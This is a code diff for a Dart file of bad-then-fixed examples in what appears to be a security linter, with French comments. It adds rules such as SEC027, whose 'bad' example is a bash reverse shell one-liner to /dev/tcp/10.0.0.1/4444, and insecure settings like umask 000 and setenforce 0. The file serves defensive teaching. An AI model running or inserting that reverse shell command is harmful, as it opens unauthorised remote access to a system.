@@ -4,6 +4,7 @@
 library;
 
 import '../i18n.dart';
+import 'lang_catalog.dart';
 
 class CodeExample {
   /// Code fautif, puis code corrigé.
@@ -21,7 +22,8 @@ class CodeExample {
 
 /// Exemple de correction d'une règle, ou null si aucun n'est rédigé.
 CodeExample? exampleFor(String ruleId) =>
-    ruleExamples[_aliases[ruleId] ?? _banditToRuff(ruleId) ?? ruleId];
+    ruleExamples[_aliases[ruleId] ?? _banditToRuff(ruleId) ?? ruleId] ??
+    langExamples[ruleId];
 
 /// Code Bandit → code Ruff de même numéro (`B602` → `S602`).
 String? _banditToRuff(String id) {
@@ -154,6 +156,15 @@ echo "deb [signed-by=/usr/share/keyrings/example.gpg] https://repo.example.com/ 
   > /etc/apt/sources.list.d/example.list'''),
   'SEC026': CodeExample(r'''git clone https://github.com/org/outil.git''',
       r'''git clone --branch v1.4.2 --depth 1 https://github.com/org/outil.git'''),
+  'SEC027': CodeExample(
+      r'''bash -i >& /dev/tcp/10.0.0.1/4444 0>&1''', r'''ssh admin@10.0.0.1''',
+      badEn: r'''bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'''),
+  'SEC028': CodeExample(r'''umask 000''', r'''umask 027'''),
+  'SEC029': CodeExample(
+      r'''token=$RANDOM$RANDOM''', r'''token=$(openssl rand -hex 16)'''),
+  'SEC030': CodeExample(r'''setenforce 0''',
+      r'''semanage permissive -a httpd_t   # exception ciblée''',
+      goodEn: r'''semanage permissive -a httpd_t   # targeted exception'''),
   'DKR001': CodeExample(
       r'''FROM python:latest''', r'''FROM python:3.12.6-slim@sha256:…'''),
   'DKR002': CodeExample(r'''FROM debian:12
